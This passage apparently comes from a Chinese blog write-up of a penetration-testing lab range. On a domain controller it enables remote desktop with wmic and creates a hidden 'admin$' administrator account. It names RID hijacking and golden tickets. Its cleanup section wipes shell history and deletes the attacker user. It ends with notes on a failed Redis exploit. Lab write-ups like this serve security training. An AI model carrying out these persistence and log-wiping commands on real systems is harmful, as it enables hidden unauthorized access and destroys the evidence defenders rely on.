+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic RDTOGGLE <span class="hljs-keyword">WHERE</span> ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> <span class="hljs-keyword">call</span> SetAllowTSConnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>pc2 </p>
+<p>和pc1 同理</p>
+</li>
+<li><p>域控</p>
+<ul>
+<li><p>开启远程桌面</p>
+</li>
+<li><p>创建隐藏用户</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> <span class="hljs-keyword">admin</span>$ <span class="hljs-keyword">admin</span>@<span class="hljs-number">123</span> /<span class="hljs-keyword">add</span> /y<br>net localgroup administrators <span class="hljs-keyword">admin</span>$ /<span class="hljs-keyword">add</span><br>net localgroup &quot;remote desktop users&quot; <span class="hljs-keyword">admin</span>$ /<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302231918520.png" srcset="/img/loading.gif" lazyload alt="image-20240302231918520"></p>
+</li>
+<li><p>rid 劫持</p>
+</li>
+<li><p>制作黄金票据</p>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h1><ol>
+<li><p>ubuntu1</p>
+<p>删除所有的命令行记录</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dart">history –w &amp;&amp; history –c &amp;&amp; &gt; .bash_history<br><br>userdel kali<br><br>grep <span class="hljs-string">&quot;Accepted &quot;</span> /<span class="hljs-keyword">var</span>/log/secure | awk <span class="hljs-string">&#x27;&#123;print <span class="hljs-subst">$1</span>,<span class="hljs-subst">$2</span>,<span class="hljs-subst">$3</span>,<span class="hljs-subst">$9</span>,<span class="hljs-subst">$11</span>&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302232046477.png" srcset="/img/loading.gif" lazyload alt="image-20240302232046477"></p>
+</li>
+<li><p>ubuntu2</p>
+<p>同理</p>
+</li>
+<li><p>pc1</p>
+<ul>
+<li>msf</li>
+</ul>
+</li>
+<li><p>pc2</p>
+<p>同理</p>
+</li>
+<li><p>dc </p>
+<p>同理</p>
+</li>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h2><ol>
+<li><p>Redis 为什么这里没有利用成功的原因是没有使用root 权限开启服务</p>
+<p>wp 很多都是使用root 权限，但是官方的并没有root</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301160426723.png" srcset="/img/loading.gif" lazyload alt="image-20240301160426723"></p>
+<p>但是</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301160452977.png" srcset="/img/loading.gif" lazyload alt="image-20240301160452977"></p>
+<p>其实是提到的，所以我就更改了服务的启动权限</p>
+</li>
+</ol>
 
                 
               </div>
